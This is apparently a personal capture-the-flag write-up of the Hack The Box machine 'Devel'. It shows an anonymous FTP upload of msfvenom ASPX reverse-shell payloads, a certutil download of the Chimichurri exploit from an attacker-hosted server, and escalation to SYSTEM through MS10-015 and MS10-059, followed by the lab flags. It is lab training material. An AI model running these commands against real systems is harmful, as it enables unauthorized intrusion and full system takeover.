---
date: 2024-09-30
title: Devel HTB Write-Up
machine_ip: 10.10.10.5
os: Windows
difficulty: Easy
my_rating: 4
tags:
  - Windows
  - PrivEsc
  - kitrap0d
  - metasploit
  - netcat
  - kernel
  - Chimichurri
  - MS10-015
  - MS10-059
  - MSFvenom
  - certutil
  - python
  - FTP
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Nmap
```
┌──(root㉿kali)-[~]
└─# nmap -sVC 10.10.10.5       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-30 18:22 PDT
Nmap scan report for 10.10.10.5
Host is up (0.14s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.36 seconds

```
- FTP
```
┌──(root㉿kali)-[~]
└─# ftp 10.10.10.5  
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -R
229 Entering Extended Passive Mode (|||49160|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> get aspnet_client
local: aspnet_client remote: aspnet_client
229 Entering Extended Passive Mode (|||49162|)
550 Access is denied. 
ftp> get iisstart.htm
local: iisstart.htm remote: iisstart.htm
229 Entering Extended Passive Mode (|||49163|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|   689        6.87 KiB/s    00:00 ETA
226 Transfer complete.
689 bytes received in 00:00 (6.86 KiB/s)
ftp> get welcome.png
local: welcome.png remote: welcome.png
229 Entering Extended Passive Mode (|||49164|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|   180 KiB  230.45 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 820 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
184946 bytes received in 00:00 (230.40 KiB/s)
ftp> 

```

- Banner
```
msf6 auxiliary(dos/windows/ftp/iis75_ftpd_iac_bof) > run
[*] Running module against 10.10.10.5

[*] 10.10.10.5:21 - banner: 220 Microsoft FTP Service
[*] Auxiliary module execution completed
```

# Foothold
- `msf6 post(multi/recon/local_exploit_suggester)`

msfvenom aspx payload
```
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f aspx >shell.aspx  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2703 bytes
```

PUT shell.aspx
```
ftp> put shell.aspx 
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49181|)
125 Data connection already open; Transfer starting.
100% |***************************************************************************************************************|  2741       51.25 MiB/s    --:-- ETA
226 Transfer complete.
2741 bytes sent in 00:00 (19.37 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49182|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
10-01-24  04:45AM                38273 reverse.asp
10-01-24  05:02AM                 2924 reverse.aspx
10-01-24  05:06AM                 2741 shell.aspx
10-01-24  04:38AM       <DIR>          UNQUVKEJED
10-01-24  04:36AM       <DIR>          WCGHGYAMXC
03-17-17  05:37PM               184946 welcome.png
10-01-24  04:37AM       <DIR>          XVZYNXRIWM
226 Transfer complete.
```

Catch shell
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 1337                                                                        
listening on [any] 1337 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.5] 49183
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```

msfconsole way:
```
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f aspx >exploit.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2891 bytes
```

```
msf6 exploit(multi/handler) > options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Run meterpreter listener and navigate to shell in url
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.5:49186) at 2024-09-30 19:12:47 -0700

meterpreter > getuid
Server username: IIS APPPOOL\Web
```


For more enumeration: [[🦊TCM Security/PrivEsc_Windows/2_Exploring_Automated_Tools]]

# PrivEsc
- escalate from web shell to user to root
- Upload tools to rhost to find attack vectors
```
meterpreter> cd c:\\windows\\temp	

meterpreter > upload /root/Downloads/winPEASx64.exe
[*] Uploading  : /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 8.00 MiB of 9.39 MiB (85.17%): /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Uploaded 9.39 MiB of 9.39 MiB (100.0%): /root/Downloads/winPEASx64.exe -> winPEASx64.exe
[*] Completed  : /root/Downloads/winPEASx64.exe -> winPEASx64.exe
``` 

Run winPEAS
```
meterpreter > shell

c:\windows\temp>winPEASx64.exe
```

Run `post/multi/recon/local_exploit_suggester`

```
meterpreter > run post/multi/recon/local_exploit_suggester 

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 196 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 9:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!                                                                                                            
 3   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 9   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 12  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 17  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 18  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 19  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system                                                                                                                                                  
 20  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 21  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 22  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 23  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 24  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found                                                                                                                                                       
 25  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 26  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 27  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 28  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 29  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 30  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 31  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store                                                                                                                                                
 32  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 33  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 39  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.

```

# Exploitation

## Metasploit Method
1. Background the session
	1. `bg session`
2.  Use MS10-015 kitrap0d exploit
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > options

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  11               yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.4       yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)



View the full module info with the info, or info -d command.
```

Exploited
```
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.4:5555 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 4068 launched.
[*] Reflectively injecting the DLL into 4068...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 12 opened (10.10.14.4:5555 -> 10.10.10.5:49202) at 2024-10-01 14:46:13 -0700

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

3. User flag - babis
```
c:\Users\babis\Desktop>type user.txt
type user.txt
dc9de1a7dfec1f3f1eafc09aa7ede2ea
```

4. Root flag
```
c:\Users\Administrator\Desktop>type root.txt
type root.txt
56738ddd739b096a539b9256b3abeb12
```

---

## Manual Method

1. Create reverse tcp payload with `msfvenom` 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=5555 -f aspx >manual.aspx
```

2. Use ftp to `PUT` `manual.aspx` payload on `10.10.10.5` server
```
┌──(root㉿kali)-[~]
└─# ftp anonymous@10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put manual.aspx 
local: manual.aspx remote: manual.aspx
229 Entering Extended Passive Mode (|||49204|)
150 Opening ASCII mode data connection.
100% |***************************************************************************************************************|  2753       65.63 MiB/s    --:-- ETA
226 Transfer complete.
2753 bytes sent in 00:00 (26.85 KiB/s)
```

3. Create listener on specified port from payload
```
nc -lnvp 5555
```

4. Navigate to url `10.10.10.5/manual.aspx` to catch shell in `nc` 
```
┌──(root㉿kali)-[~]
└─# nc -lnvp 5555 
listening on [any] 5555 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.5] 49210
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami    
whoami
iis apppool\web
```

5. Found exploit that give local system shell, **==MS10-059 (Chimichurri)==**. Download `.exe` and start python server to transfer file (`cd` to location of file)
```python3
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.5 - - [01/Oct/2024 15:10:41] "GET /Chimichurri.exe HTTP/1.1" 200 -
```

```certutil
c:\Windows\Temp>certutil -urlcache -f http://10.10.14.4:8000/Chimichurri.exe ms.exe                                                                         
certutil -urlcache -f http://10.10.14.4:8000/Chimichurri.exe ms.exe                                                                                         
****  Online  ****                                                                                                                                          
CertUtil: -URLCache command completed successfully.  
```

6. Run start `nc` listener for used with `ms.exe` and run `ms.exe`
```nc
┌──(root㉿kali)-[~]
└─# nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.5] 49218
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Windows\Temp>whoami
whoami
nt authority\system
```

```Chimichurri
c:\Windows\Temp>ms.exe 10.10.14.4 5555
ms.exe 10.10.14.4 5555
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
```